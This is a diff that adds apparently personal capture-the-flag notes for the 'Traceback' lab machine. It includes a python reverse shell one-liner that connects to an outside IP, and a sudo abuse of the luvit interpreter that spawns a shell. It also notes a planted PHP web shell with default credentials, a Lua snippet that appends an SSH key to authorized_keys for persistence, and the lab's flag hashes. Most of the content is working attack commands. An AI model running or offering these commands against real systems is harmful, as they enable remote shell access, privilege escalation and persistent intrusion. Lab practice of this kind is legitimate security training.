@@ -1,0 +1,45 @@
+.bash_history:
+
+    webadmin@traceback:/home/webadmin$ cat .bash_history
+    cat .bash_history
+    ls -la
+    sudo -l
+    nano privesc.lua
+    sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+    rm privesc.lua
+    logout
+    sudo -u /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
+    sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
+
+
+http://10.10.10.181/smevk.php   --->    backdoor admin:admin
+
+nice rever shell --> editing authorized_kes OR python reverse shell
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",6765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c "import pty;pty.spawn('/bin/bash');"
+
+sudo -l
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+
+que cojones es luvit repl
+
+
+
+
+
+
+'x = io.open("/home/sysadmin/.ssh/authorized_keys","a")
+x:write("\n\n")
+x:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKOI5MU/G8anbGf3GlcSfa3Tsl/SkcgPf8ai4mkZvDMVKuVBygl/rOa3RTwrshuBnCEiP9Wg8+FUQSFjSqOJdJBgK9Yx5+HfhWti+UE1SjNz9vbrVRhRqZXWLphGSLlvR/b5Hcz+leW6QOFakAPGT8MT5d+X6DZdPnEycJzKr5t7h70rAKhuvTLmxByXmxG0GbLaKqCPGFEiZtWo4mQYyIhNdOa8SxE26434Utobb9mVXYdbRy9DayAAr5FBGHayfJoAc+pL8Fu7N07SFTaS7LgrwDCM1CFGC/7NQJCPUkztHd8VpVu+veVaIcMRQ+k7dIlprKfqq4vVPgIQkREOxtONCuwye1PELe1ao6C3y3+2JXW5DkYV+AY1lZ2M61kK2JeY0yc7Z1DH0GInUU/nqiCStZonV7NGul/C7SyzXRZcbWxHwHuWtCF45uSZVbn6Ye0eFwdCqcZhchQ+Lv1FOvCisT/5dFw9F6iVvIdnVderbDnJ1LYjT5o4ih4EHL6kE= sysadmin")
+x:write("\n\n")
+x:close()
+print("hs Key added...")'
+
+
+
+user.txt:f424656a4b56ad069d27c80d79e05103
+root.txt:139e1e259cc17e48718d0e50ecbdcd98
+
+
+privesc: cronjob and wellcome message poorly configured reading command from a writtable file, pspy is your frind here.
